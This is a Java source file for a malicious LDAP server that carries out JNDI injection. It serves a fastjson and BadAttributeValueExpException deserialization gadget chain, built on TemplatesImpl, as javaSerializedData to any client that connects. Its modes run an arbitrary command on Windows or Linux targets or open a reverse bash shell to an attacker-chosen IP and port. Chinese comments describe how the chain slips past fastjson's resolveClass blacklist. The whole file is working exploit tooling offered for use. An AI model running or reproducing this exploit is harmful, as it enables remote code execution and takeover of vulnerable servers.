package jndi;

import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import gadget.doubleunser.MyInputStream;
import gadget.memshell.SpringBootMemoryShellOfController;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import util.GadgetUtils;
import util.ReflectionUtils;
import util.SerializerUtils;

import javax.management.BadAttributeValueExpException;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;


public class ldapserver {


    public static void setFieldValue(Object obj, String name, Object value) throws Exception {
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, value);
    }
    private static final String LDAP_BASE = "dc=example,dc=com";

    private static String version;

    private static String command;

    private static String ip;

    private static String port;
    private static boolean isReverseShell=false;

    public static void main(String[] tmp_args) throws Exception {

        String[] args = new String[]{"http://127.0.0.1/jndi/#EvilClass"};
        if (tmp_args.length == 0 ){
            System.out.println("请至少输入目标操作系统.linux/windows");
            return;
        } else if (tmp_args.length == 1) {
            System.out.println("请输入要执行的命令");
            return;
        } else if (tmp_args.length == 3){
            isReverseShell = true;
            ip = tmp_args[1];
            port = tmp_args[2];
            System.out.println("反弹shell模式");
        }else if (tmp_args.length ==2){
            command = tmp_args[1];
            System.out.println("执行命令模式");
        }else {
            System.out.println("参数错误");
            return;
        }
        version = tmp_args[0];

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    19001,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[0])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + 19001); //$NON-NLS-1$
            ds.startListening();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        /**
         *
         */
        public OperationInterceptor(URL cb) {
            this.codebase = cb;
        }

        /**
         * {@inheritDoc}
         *
         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */
        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            } catch (Exception e1) {
                e1.printStackTrace();
            }

        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception {

            List<Object> list = new ArrayList<>();

            TemplatesImpl templates = null;

            if(isReverseShell){
                templates = GadgetUtils.getTemplatesImplReverseBashShell(ip,port);
                System.out.println("开始反弹Bash Shell,目标为："+ip+":"+port);
            }else{
                if(version.equals("windows")){
                    templates = GadgetUtils.templatesImplLocalWindows(command);
                } else if (version.equals("linux")) {
                    templates = GadgetUtils.getTemplatesImpl(command);
                }
            }
            System.out.println(templates);
            list.add(templates);          //第一次添加为了使得templates变成引用类型从而绕过JsonArray的resolveClass黑名单检测

            JSONArray jsonArray = new JSONArray();
            jsonArray.add(templates);           //此时在handles这个hash表中查到了映射，后续则会以引用形式输出

            BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
            ReflectionUtils.setFieldValue(bd,"val",jsonArray);

            list.add(bd);

            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(list);
            objectOutputStream.close();

            //jdk8u191之后
            e.addAttribute("javaClassName", "foo");
            //getObject获取Gadget

            e.addAttribute("javaSerializedData", byteArrayOutputStream.toByteArray());

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }

}